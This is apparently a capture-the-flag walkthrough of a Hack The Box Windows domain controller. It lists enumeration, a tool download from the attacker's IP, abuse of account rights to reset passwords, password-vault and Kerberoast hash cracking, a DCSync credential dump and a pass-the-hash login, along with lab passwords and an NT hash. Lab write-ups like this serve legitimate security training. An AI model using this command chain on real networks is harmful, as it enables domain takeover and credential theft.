OS: Windows
Tags: ACL Abuse, Kerberoasting, DCSync
## nmap scan 
```
sudo nmap $IP -p- -vv -n -Pn -T4
```

```
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
57713/tcp open  unknown
57718/tcp open  unknown
57737/tcp open  unknown
57740/tcp open  unknown
57776/tcp open  unknown
62033/tcp open  unknown
```

service and version number scan

```
nmap 10.10.11.42 -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,57713,57718,57737,57740,57776,62033 -vv -n -Pn -sC -sV
```

```
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-27 14:40:58Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57713/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
57718/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57737/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57740/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57776/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62033/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35406/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 34974/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 52617/udp): CLEAN (Timeout)
|   Check 4 (port 39101/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h37m32s
| smb2-time: 
|   date: 2025-06-27T14:41:53
|_  start_date: N/A
```
domain: administrator.htb0 (add to /etc/hosts)

ftp -> cannot log in with Olivia/ichliebedich
### DNS Enumeration
```
dig @10.10.11.42 administrator.htb TXT 

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.11.42 administrator.htb TXT
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 1326
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;administrator.htb.             IN      TXT

;; AUTHORITY SECTION:
administrator.htb.      3600    IN      SOA     dc.administrator.htb. hostmaster.administrator.htb. 124 900 600 86400 3600

;; Query time: 11 msec
;; SERVER: 10.10.11.42#53(10.10.11.42) (UDP)
;; WHEN: Fri Jun 27 16:14:05 +08 2025
;; MSG SIZE  rcvd: 96
```
so the dc is dc.administrator.htb

tried to do axfr zone transfer and internal zone transfer --> nothing 

## LDAP Enumeration

enum4linux
```
enum4linux -u Olivia -p ichliebedich 10.10.11.42                 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jun 27 16:21:50 2025
 =========================================( Target Information )=========================================
Target ........... 10.10.11.42                                                   
RID Range ........ 500-550,1000-1050
Username ......... 'Olivia'
Password ......... 'ichliebedich'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ============================( Enumerating Workgroup/Domain on 10.10.11.42 )============================
[E] Can't find workgroup/domain  
 ====================================( Session Check on 10.10.11.42 )====================================     
[+] Server 10.10.11.42 allows sessions using username 'Olivia', password 'ichliebedich'                                                                                                        
 =================================( Getting domain SID for 10.10.11.42 )=================================
Domain Name: ADMINISTRATOR                                                       
Domain Sid: S-1-5-21-1088858960-373806567-254189436
[+] Host is part of a domain (not a workgroup)                                   
enum4linux complete on Fri Jun 27 16:22:00 2025 
```

### SMB Enumeration
```
smbmap -H 10.10.11.42 -u Olivia -p ichliebedich -d administrator.htb
```

```
[+] IP: 10.10.11.42:445 Name: administrator.htb         Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
```
nothing much found either


## Winrm 
it is possible to login as Olivia to winrm
```
crackmapexec winrm 10.10.11.42 -u 'Olivia' -p 'ichliebedich' 
SMB         10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
HTTP        10.10.11.42     5985   DC               [*] http://10.10.11.42:5985/wsman
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\Olivia:ichliebedich (Pwn3d!)
```

Get sharphound.ps1 from here https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1

start a python http server
```
python3 -m http.server
```

download it on the administrator server
```
(New-Object Net.WebClient).DownloadFile('http://10.10.14.26:8000/SharpHound.ps1','C:\Users\olivia\Desktop\SharpHound.ps1')
```
then we run sharphound
```
.\SharpHound.exe -c All --LdapUsername Olivia --LdapPassword ichliebedich --ZipFileName htb.zip
```

then we move the htb.zip folder back to the VM through impacket-smbserver that i set up
load that into bloodhound and see what 

## Bloodhound
make olivia an owned target
Go to cypher -> Queries -> Shortest Path from owned objects
![](../Assets/Screenshot%202025-06-27%20at%204.56.59%20PM.png)
olivia has a generic all to michael which has forcechangepassword to bejamin and bejamin is a member of share moderators 

## Becoming michael
we need to download powerview and then transfer it over to the administrator machine first
In evil-winrm:
```
$SecPassword = ConvertTo-SecureString 'ichliebedich' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('administrator.htb\Olivia', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity michael -AccountPassword $UserPassword -Credential $Cred
```
can use evil-winrm to login as michael and see around if there is a user flag but there is not user flag
## Becoming benjamin
```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('administrator.htb\Michael', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword -Credential $Cred
```
so we have changed the password of benjamin to Password123!

Benjamin can't login into winrm but it can log into smb and its a share moderator
![](../Assets/Screenshot%202025-06-27%20at%205.07.14%20PM.png)
smb enumeration with benjamin had no new info tho
![](../Assets/Screenshot%202025-06-27%20at%205.09.43%20PM.png)

benjamin can also log into ftp 
![](../Assets/Screenshot%202025-06-27%20at%205.10.15%20PM.png)

ftp 
```
ftp 10.10.11.42 
```
there is a file called Backup.psafe3

```
get Backup.psafe3
```
it will be in our working directory

```
file Backup.psafe3                                                                                         
Backup.psafe3: Password Safe V3 database
```

crack with john the ripper
```
pwsafe2john Backup.psafe3 > crack.txt
john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
```
we get the password tekieromucho

install passwordsafe in kali is just
```
sudo apt install passwordsafe
```
and then run it, load the backup.psafe3 and enter the password


we get the password of 3 ppl
![](../Assets/Screenshot%202025-06-27%20at%205.23.17%20PM.png)

| username  | password                       |
| --------- | ------------------------------ |
| alexander | UrkIbagoxMyUGw0aPlj9B0AXSea4Sw |
| emily     | UXLCI5iETUsIBoFVTj8yQFKoHjXmb  |
| emma      | WwANQWnmJnGV07WQN8bMS7FMAbjNur |

add them in bloodhound as owned objects, 
in bloodhound you can see, only emily has remote desktop management (that means we can only log in as her in evil-winrm)
![](../Assets/Screenshot%202025-06-27%20at%205.31.06%20PM.png)

log in into evil-winrm with emily username and password and the flag in the her Desktop

### Becoming ethan 
From there we can try to become Ethan 
Emily has GenericWrite over ethan

We can do a targettedKerberoast attack on ethan using targetedKerberoast.py
https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py

run this command and we get the hash of ethan
```
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```
![](../Assets/Screenshot%202025-06-27%20at%206.21.24%20PM.png)
if you run into a problem like this; 
![](../Assets/Screenshot%202025-06-27%20at%206.16.14%20PM.png)

just do 
```
sudo timedatectl set-ntp off 
sudo rdate -n <ip addr of administrator.htb>
```


crack the hash of ethan
copy the hash into a hash.txt file
```
hashcat -m 13100 hash.txt /usr/share/wordlist/rockyou.txt
```
![](../Assets/Screenshot%202025-06-27%20at%206.23.11%20PM.png)

we get the password: limpbizkit

Now we know that Ethan has getchangesall on the domain that will allow him to perform dcsync
![](../Assets/Screenshot%202025-06-27%20at%206.28.37%20PM.png)

we can perform a dcsync using impacket-secretsdump
```
impacket-secretsdump -outputfile administrator.htb -just-dc administrator.htb/ethan@10.10.11.42
```
![](../Assets/Screenshot%202025-06-27%20at%206.32.09%20PM.png)

we get a lot of hashes but we can just take the nt hash for administrator `3dc553ce4b9fd20bd016e098d2d2fd2e` and then hash the pass thru evil-winrm

```
evil-winrm -i 10.10.11.42 -u Administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
```
you can find the flag in the desktop folder

yippee we have pwn the machine!